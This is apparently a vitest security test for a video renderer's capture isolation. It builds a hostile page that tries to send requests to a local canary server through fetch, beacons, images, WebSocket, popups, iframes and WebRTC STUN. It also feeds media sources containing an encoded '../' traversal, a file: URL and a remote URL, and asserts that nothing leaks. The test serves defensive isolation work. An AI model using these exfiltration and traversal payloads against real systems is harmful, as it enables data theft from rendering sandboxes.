import { execFileSync } from "node:child_process";
import { createSocket } from "node:dgram";
import { copyFile, mkdir, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import type { AddressInfo } from "node:net";
import { networkInterfaces } from "node:os";
import { join } from "node:path";
import { createLogger } from "@studix/shared";
import { afterAll, describe, expect, it } from "vitest";
import { renderWithProducer } from "../src/hyperframes/producer-render.ts";
import { renderToolchain, tempDir } from "./render-test-helpers.ts";

const toolchain = renderToolchain();
const require = createRequire(import.meta.url);
const cleanups: (() => Promise<void> | void)[] = [];
afterAll(async () => {
  for (const cleanup of cleanups.reverse()) await cleanup();
});

/** An address of this host that is not loopback: a request to it would leave the browser's own machine. */
function externalAddress(): string | undefined {
  for (const list of Object.values(networkInterfaces())) {
    const found = list?.find((a) => a.family === "IPv4" && !a.internal);
    if (found) return found.address;
  }
  return undefined;
}

const host = externalAddress();

/** Mean RGB of one frame at `seconds`, as 0..255 integers. */
function frameColor(file: string, seconds: number): [number, number, number] {
  const raw = execFileSync(
    "ffmpeg",
    [
      "-v",
      "error",
      "-ss",
      String(seconds),
      "-i",
      file,
      "-frames:v",
      "1",
      "-vf",
      "scale=1:1",
      "-f",
      "rawvideo",
      "-pix_fmt",
      "rgb24",
      "-",
    ],
    { maxBuffer: 1024 },
  );
  return [raw[0]!, raw[1]!, raw[2]!];
}

// The page script stands for any JavaScript that reaches a capture: it tries every route out of the render.
function hostileIndexHtml(canary: string, stunPort: number, secretSrcs: string[]): string {
  const media = secretSrcs
    .map(
      (src, i) =>
        `    <video id="leak-${i}" data-start="0" data-duration="1" data-track-index="2" src="${src}" muted playsinline style="position:absolute;inset:0;width:160px;height:90px"></video>`,
    )
    .join("\n");
  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <script src="assets/vendor/gsap.min.js"></script>
    <style>html, body, #root { margin: 0; width: 160px; height: 90px; overflow: hidden; background: #000; }</style>
  </head>
  <body>
    <div id="root" data-composition-id="main" data-start="0" data-duration="1" data-width="160" data-height="90"></div>
    <script>
      (function () {
        var canary = ${JSON.stringify(canary)};
        try { fetch(canary + "/fetch", { mode: "no-cors" }).catch(function () {}); } catch (e) {}
        try { navigator.sendBeacon(canary + "/beacon", "x"); } catch (e) {}
        try { new Image().src = canary + "/image"; } catch (e) {}
        try { new WebSocket(canary.replace("http", "ws") + "/ws"); } catch (e) {}
        try { window.open(canary + "/popup"); } catch (e) {}
        try {
          var frame = document.createElement("iframe");
          frame.src = canary + "/iframe";
          document.body.appendChild(frame);
        } catch (e) {}
        try {
          var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:${host}:${stunPort}" }] });
          pc.createDataChannel("x");
          pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
        } catch (e) {}
        var root = document.getElementById("root");
        root.insertAdjacentHTML("beforeend", ${JSON.stringify(media)});
        var tl = gsap.timeline({ paused: true });
        tl.set({}, {}, 1);
        window.__timelines = window.__timelines || {};
        window.__timelines.main = tl;
      })();
    </script>
  </body>
</html>
`;
}

/** A started canary: an HTTP/WebSocket server and a UDP (STUN) socket on a non-loopback address. */
async function startCanary(address: string) {
  const hits: string[] = [];
  const http = createServer((req, res) => {
    hits.push(`http ${req.url}`);
    res.end("leak");
  });
  http.on("upgrade", (req, socket) => {
    hits.push(`ws ${req.url}`);
    socket.destroy();
  });
  await new Promise<void>((resolve) => http.listen(0, "0.0.0.0", resolve));
  cleanups.push(() => new Promise<void>((resolve) => http.close(() => resolve())));
  const udp = createSocket("udp4");
  udp.on("message", () => hits.push("udp stun"));
  await new Promise<void>((resolve) => udp.bind(0, "0.0.0.0", resolve));
  cleanups.push(() => udp.close());
  return {
    hits,
    url: `http://${address}:${(http.address() as AddressInfo).port}`,
    stunPort: (udp.address() as AddressInfo).port,
  };
}

describe.skipIf(!toolchain.ok || !host)(
  `HyperFrames capture isolation${toolchain.ok ? "" : ` (skipped: ${toolchain.reason})`}`,
  () => {
    async function capture(secretSrcs: (secret: string, canaryUrl: string) => string[]) {
      const canary = await startCanary(host!);
      const { dir, cleanup } = await tempDir("capture-isolation");
      cleanups.push(cleanup);
      // A red clip outside the project: the render must not show it.
      const secret = join(dir, "secret", "secret.mp4");
      await mkdir(join(dir, "secret"), { recursive: true });
      execFileSync("ffmpeg", [
        "-v",
        "error",
        "-f",
        "lavfi",
        "-i",
        "color=c=red:s=160x90:d=1:r=12",
        "-pix_fmt",
        "yuv420p",
        secret,
      ]);
      const projectDir = join(dir, "a", "b", "project");
      await mkdir(join(projectDir, "assets", "vendor"), { recursive: true });
      await copyFile(
        require.resolve("gsap/dist/gsap.min.js"),
        join(projectDir, "assets", "vendor", "gsap.min.js"),
      );
      await writeFile(
        join(projectDir, "index.html"),
        hostileIndexHtml(canary.url, canary.stunPort, secretSrcs(secret, canary.url)),
      );
      const outputPath = join(dir, "out.mp4");
      await renderWithProducer({
        projectDir,
        outputPath,
        fps: 12,
        quality: "draft",
        crf: 30,
        workers: 1,
        logger: createLogger({ component: "capture-isolation-test" }, { level: "error" }),
        onProgress: () => {},
      });
      // Give late browser requests (beacons, ICE gathering) a moment to arrive.
      await new Promise((resolve) => setTimeout(resolve, 500));
      return { hits: canary.hits, outputPath };
    }

    it("sends no request from page scripts off the machine", async () => {
      const { hits, outputPath } = await capture(() => []);
      expect(hits).toEqual([]);
      expect(frameColor(outputPath, 0.5)).toEqual([0, 0, 0]);
    });

    it.each([
      ["an encoded ../ path", () => "..%2f..%2f..%2fsecret%2fsecret.mp4"],
      ["a file: URL", (secret: string) => `file://${secret}`],
      ["an http: URL", (_: string, canaryUrl: string) => `${canaryUrl}/media.mp4`],
    ])("keeps runtime media with %s out of the render", async (_name, src) => {
      const { hits, outputPath } = await capture((secret, canaryUrl) => [src(secret, canaryUrl)]);
      expect(frameColor(outputPath, 0.5)).toEqual([0, 0, 0]);
      expect(hits).toEqual([]);
    });
  },
);
